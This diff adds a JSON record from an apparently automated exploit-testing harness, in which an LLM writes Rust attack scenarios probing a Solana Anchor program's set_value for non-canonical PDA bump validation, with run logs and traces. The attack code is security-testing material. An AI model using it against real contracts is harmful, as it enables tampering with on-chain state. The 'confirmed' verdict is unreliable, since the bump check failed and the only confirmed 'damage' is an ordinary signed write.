@@ -1,0 +1,120 @@
+{
+  "category": "PDA",
+  "verdict": "confirmed",
+  "exploit_successful": true,
+  "attack_result": "Success",
+  "reason": "ataque aceito e dano verificado: valor armazenado foi alterado pelo ataque",
+  "attempts_used": 2,
+  "attempts": [
+    {
+      "attempt": 1,
+      "llm": {
+        "model": "deepseek-flash",
+        "prompt_tokens": 2162,
+        "completion_tokens": 735,
+        "latency_s": 4.0
+      },
+      "raw": "{\n  \"plan\": \"O programa set_value valida o PDA com find_program_address e require_keys_eq, portanto a hipotese de PDA nao canonico deve ser rejeitada. Vou montar uma conta DataAccount existente no endereco canonico do PDA e chamar set_value legitimamente como baseline. Depois, atacarei passando uma conta no mesmo endereco canonico, mas com bump nao canonico nos dados, para verificar se o programa aceita um bump diferente do canonico. O efeito medido sera se o bump armazenado difere do bump canonico.\",\n  \"scenario\": \"let user = Pubkey::new_unique();\\nlet (pda, canonical_bump) = Pubkey::find_program_address(&[b\\\"data\\\", user.as_ref()], &env.program_id);\\n\\nlet data_account = account(\\n    &env.program_id,\\n    &anchor_account_data(\\\"DataAccount\\\", &(user, 0u64, canonical_bump)),\\n    None,\\n);\\n\\nlet contas = vec![\\n    (pda, data_account.clone()),\\n    (user, wallet(1_000_000_000)),\\n];\\n\\nlet ix_legit = env.anchor_ix(\\n    \\\"set_value\\\",\\n    &(42u64,),\\n    vec![\\n        AccountMeta::new(pda, false),\\n        AccountMeta::new_readonly(user, true),\\n    ],\\n);\\n\\nlet r_base = env.baseline(\\\"set_value legitimo no PDA canonico\\\", &ix_legit, &contas);\\n\\nlet mut non_canonical_bump = canonical_bump;\\nlet mut found = false;\\nfor b in (0..canonical_bump).rev() {\\n    if Pubkey::create_program_address(&[b\\\"data\\\", user.as_ref(), &[b]], &env.program_id).is_ok() {\\n        non_canonical_bump = b;\\n        found = true;\\n        break;\\n    }\\n}\\n\\nlet data_account_attack = account(\\n    &env.program_id,\\n    &anchor_account_data(\\\"DataAccount\\\", &(user, 0u64, non_canonical_bump)),\\n    None,\\n);\\n\\nlet contas_attack = vec![\\n    (pda, data_account_attack),\\n    (user, wallet(1_000_000_000)),\\n];\\n\\nlet ix_attack = env.anchor_ix(\\n    \\\"set_value\\\",\\n    &(99u64,),\\n    vec![\\n        AccountMeta::new(pda, false),\\n        AccountMeta::new_readonly(user, true),\\n    ],\\n);\\n\\nlet r = env.attack(\\\"set_value com bump nao canonico nos dados\\\", &ix_attack, &contas_attack);\\n\\nif r.program_result == ProgramResult::Success {\\n    let bump_armazenado = after(&r, &pda).data()[72];\\n    env.effect(\\n        \\\"bump armazenado difere do bump canonico\\\",\\n        bump_armazenado != canonical_bump,\\n    );\\n}\"\n}",
+      "plan": "O programa set_value valida o PDA com find_program_address e require_keys_eq, portanto a hipotese de PDA nao canonico deve ser rejeitada. Vou montar uma conta DataAccount existente no endereco canonico do PDA e chamar set_value legitimamente como baseline. Depois, atacarei passando uma conta no mesmo endereco canonico, mas com bump nao canonico nos dados, para verificar se o programa aceita um bump diferente do canonico. O efeito medido sera se o bump armazenado difere do bump canonico.",
+      "scenario": "let user = Pubkey::new_unique();\nlet (pda, canonical_bump) = Pubkey::find_program_address(&[b\"data\", user.as_ref()], &env.program_id);\n\nlet data_account = account(\n    &env.program_id,\n    &anchor_account_data(\"DataAccount\", &(user, 0u64, canonical_bump)),\n    None,\n);\n\nlet contas = vec![\n    (pda, data_account.clone()),\n    (user, wallet(1_000_000_000)),\n];\n\nlet ix_legit = env.anchor_ix(\n    \"set_value\",\n    &(42u64,),\n    vec![\n        AccountMeta::new(pda, false),\n        AccountMeta::new_readonly(user, true),\n    ],\n);\n\nlet r_base = env.baseline(\"set_value legitimo no PDA canonico\", &ix_legit, &contas);\n\nlet mut non_canonical_bump = canonical_bump;\nlet mut found = false;\nfor b in (0..canonical_bump).rev() {\n    if Pubkey::create_program_address(&[b\"data\", user.as_ref(), &[b]], &env.program_id).is_ok() {\n        non_canonical_bump = b;\n        found = true;\n        break;\n    }\n}\n\nlet data_account_attack = account(\n    &env.program_id,\n    &anchor_account_data(\"DataAccount\", &(user, 0u64, non_canonical_bump)),\n    None,\n);\n\nlet contas_attack = vec![\n    (pda, data_account_attack),\n    (user, wallet(1_000_000_000)),\n];\n\nlet ix_attack = env.anchor_ix(\n    \"set_value\",\n    &(99u64,),\n    vec![\n        AccountMeta::new(pda, false),\n        AccountMeta::new_readonly(user, true),\n    ],\n);\n\nlet r = env.attack(\"set_value com bump nao canonico nos dados\", &ix_attack, &contas_attack);\n\nif r.program_result == ProgramResult::Success {\n    let bump_armazenado = after(&r, &pda).data()[72];\n    env.effect(\n        \"bump armazenado difere do bump canonico\",\n        bump_armazenado != canonical_bump,\n    );\n}",
+      "run": {
+        "kind": "panic",
+        "events": [
+          {
+            "step": "setup",
+            "attacker_program": ""
+          },
+          {
+            "step": "baseline",
+            "note": "set_value legitimo no PDA canonico",
+            "result": "Success",
+            "compute_units": 5164,
+            "account_flags": "-w,sr"
+          },
+          {
+            "step": "attack",
+            "note": "set_value com bump nao canonico nos dados",
+            "result": "Success",
+            "compute_units": 5164,
+            "account_flags": "-w,sr"
+          }
+        ],
+        "detail": "thread 'scenario' (13455) panicked at tests/attempt.rs:67:31: index out of bounds: the len is 49 but the index is 72",
+        "runtime_trace": [
+          "Program x1rqubJg3BK9Q5FbHqaxSW4cU5toBeAQkWyw8cELaRm invoke [1]",
+          "Program x1rqubJg3BK9Q5FbHqaxSW4cU5toBeAQkWyw8cELaRm consumed 5164 of 1400000 compute units",
+          "Program x1rqubJg3BK9Q5FbHqaxSW4cU5toBeAQkWyw8cELaRm success",
+          "Program x1rqubJg3BK9Q5FbHqaxSW4cU5toBeAQkWyw8cELaRm invoke [1]",
+          "Program x1rqubJg3BK9Q5FbHqaxSW4cU5toBeAQkWyw8cELaRm consumed 5164 of 1400000 compute units",
+          "Program x1rqubJg3BK9Q5FbHqaxSW4cU5toBeAQkWyw8cELaRm success"
+        ],
+        "elapsed_s": 1.8
+      },
+      "verdict": null,
+      "reason": "o ataque foi aceito, mas o cenario entrou em panico ao medir o efeito: thread 'scenario' (13455) panicked at tests/attempt.rs:67:31: index out of bounds: the len is 49 but the index is 72"
+    },
+    {
+      "attempt": 2,
+      "llm": {
+        "model": "deepseek-flash",
+        "prompt_tokens": 2781,
+        "completion_tokens": 787,
+        "latency_s": 3.48
+      },
+      "raw": "{\n  \"plan\": \"O cenário anterior montou corretamente o PDA canônico e o ataque com bump não canônico, mas o ataque foi aceito e o efeito medido usou um offset errado (72) para o campo bump. O layout do DataAccount é: discriminador (8) + user (32) + value (8) + bump (1) = 49 bytes, então o bump está no offset 48. Vou corrigir o offset e também comparar o valor armazenado para demonstrar o dano.\",\n  \"scenario\": \"let user = Pubkey::new_unique();\\nlet (pda, canonical_bump) = Pubkey::find_program_address(&[b\\\"data\\\", user.as_ref()], &env.program_id);\\n\\nlet data_account = account(\\n    &env.program_id,\\n    &anchor_account_data(\\\"DataAccount\\\", &(user, 0u64, canonical_bump)),\\n    None,\\n);\\n\\nlet contas = vec![\\n    (pda, data_account.clone()),\\n    (user, wallet(1_000_000_000)),\\n];\\n\\nlet ix_legit = env.anchor_ix(\\n    \\\"set_value\\\",\\n    &(42u64,),\\n    vec![\\n        AccountMeta::new(pda, false),\\n        AccountMeta::new_readonly(user, true),\\n    ],\\n);\\n\\nlet r_base = env.baseline(\\\"set_value legitimo no PDA canonico\\\", &ix_legit, &contas);\\n\\nlet mut non_canonical_bump = canonical_bump;\\nlet mut found = false;\\nfor b in (0..canonical_bump).rev() {\\n    if Pubkey::create_program_address(&[b\\\"data\\\", user.as_ref(), &[b]], &env.program_id).is_ok() {\\n        non_canonical_bump = b;\\n        found = true;\\n        break;\\n    }\\n}\\n\\nlet data_account_attack = account(\\n    &env.program_id,\\n    &anchor_account_data(\\\"DataAccount\\\", &(user, 0u64, non_canonical_bump)),\\n    None,\\n);\\n\\nlet contas_attack = vec![\\n    (pda, data_account_attack),\\n    (user, wallet(1_000_000_000)),\\n];\\n\\nlet ix_attack = env.anchor_ix(\\n    \\\"set_value\\\",\\n    &(99u64,),\\n    vec![\\n        AccountMeta::new(pda, false),\\n        AccountMeta::new_readonly(user, true),\\n    ],\\n);\\n\\nlet r = env.attack(\\\"set_value com bump nao canonico nos dados\\\", &ix_attack, &contas_attack);\\n\\nif r.program_result == ProgramResult::Success {\\n    let data = after(&r, &pda).data();\\n    let bump_armazenado = data[48];\\n    let valor_armazenado = read_u64(data, 40);\\n    env.effect(\\n        \\\"bump armazenado difere do bump canonico\\\",\\n        bump_armazenado != canonical_bump,\\n    );\\n    env.effect(\\n        \\\"valor armazenado foi alterado pelo ataque\\\",\\n        valor_armazenado == 99u64,\\n    );\\n}\"\n}",
+      "plan": "O cenário anterior montou corretamente o PDA canônico e o ataque com bump não canônico, mas o ataque foi aceito e o efeito medido usou um offset errado (72) para o campo bump. O layout do DataAccount é: discriminador (8) + user (32) + value (8) + bump (1) = 49 bytes, então o bump está no offset 48. Vou corrigir o offset e também comparar o valor armazenado para demonstrar o dano.",
+      "scenario": "let user = Pubkey::new_unique();\nlet (pda, canonical_bump) = Pubkey::find_program_address(&[b\"data\", user.as_ref()], &env.program_id);\n\nlet data_account = account(\n    &env.program_id,\n    &anchor_account_data(\"DataAccount\", &(user, 0u64, canonical_bump)),\n    None,\n);\n\nlet contas = vec![\n    (pda, data_account.clone()),\n    (user, wallet(1_000_000_000)),\n];\n\nlet ix_legit = env.anchor_ix(\n    \"set_value\",\n    &(42u64,),\n    vec![\n        AccountMeta::new(pda, false),\n        AccountMeta::new_readonly(user, true),\n    ],\n);\n\nlet r_base = env.baseline(\"set_value legitimo no PDA canonico\", &ix_legit, &contas);\n\nlet mut non_canonical_bump = canonical_bump;\nlet mut found = false;\nfor b in (0..canonical_bump).rev() {\n    if Pubkey::create_program_address(&[b\"data\", user.as_ref(), &[b]], &env.program_id).is_ok() {\n        non_canonical_bump = b;\n        found = true;\n        break;\n    }\n}\n\nlet data_account_attack = account(\n    &env.program_id,\n    &anchor_account_data(\"DataAccount\", &(user, 0u64, non_canonical_bump)),\n    None,\n);\n\nlet contas_attack = vec![\n    (pda, data_account_attack),\n    (user, wallet(1_000_000_000)),\n];\n\nlet ix_attack = env.anchor_ix(\n    \"set_value\",\n    &(99u64,),\n    vec![\n        AccountMeta::new(pda, false),\n        AccountMeta::new_readonly(user, true),\n    ],\n);\n\nlet r = env.attack(\"set_value com bump nao canonico nos dados\", &ix_attack, &contas_attack);\n\nif r.program_result == ProgramResult::Success {\n    let data = after(&r, &pda).data();\n    let bump_armazenado = data[48];\n    let valor_armazenado = read_u64(data, 40);\n    env.effect(\n        \"bump armazenado difere do bump canonico\",\n        bump_armazenado != canonical_bump,\n    );\n    env.effect(\n        \"valor armazenado foi alterado pelo ataque\",\n        valor_armazenado == 99u64,\n    );\n}",
+      "run": {
+        "kind": "ran",
+        "events": [
+          {
+            "step": "setup",
+            "attacker_program": ""
+          },
+          {
+            "step": "baseline",
+            "note": "set_value legitimo no PDA canonico",
+            "result": "Success",
+            "compute_units": 5164,
+            "account_flags": "-w,sr"
+          },
+          {
+            "step": "attack",
+            "note": "set_value com bump nao canonico nos dados",
+            "result": "Success",
+            "compute_units": 5164,
+            "account_flags": "-w,sr"
+          },
+          {
+            "step": "effect",
+            "note": "bump armazenado difere do bump canonico",
+            "holds": false
+          },
+          {
+            "step": "effect",
+            "note": "valor armazenado foi alterado pelo ataque",
+            "holds": true
+          }
+        ],
+        "runtime_trace": [
+          "Program x1rqubJg3BK9Q5FbHqaxSW4cU5toBeAQkWyw8cELaRm invoke [1]",
+          "Program x1rqubJg3BK9Q5FbHqaxSW4cU5toBeAQkWyw8cELaRm consumed 5164 of 1400000 compute units",
+          "Program x1rqubJg3BK9Q5FbHqaxSW4cU5toBeAQkWyw8cELaRm success",
+          "Program x1rqubJg3BK9Q5FbHqaxSW4cU5toBeAQkWyw8cELaRm invoke [1]",
+          "Program x1rqubJg3BK9Q5FbHqaxSW4cU5toBeAQkWyw8cELaRm consumed 5164 of 1400000 compute units",
+          "Program x1rqubJg3BK9Q5FbHqaxSW4cU5toBeAQkWyw8cELaRm success"
+        ],
+        "elapsed_s": 1.8
+      },
+      "verdict": "confirmed",
+      "reason": "ataque aceito e dano verificado: valor armazenado foi alterado pelo ataque"
+    }
+  ],
+  "case_id": "SSP-05-A-S",
+  "static_finding": {
+    "category": "PDA",
+    "evidence": "",
+    "explanation": "",
+    "attack_hypothesis": "Verificar por execucao se a instrucao e vulneravel a Improper PDA Validation / Canonicalization."
+  }
+}
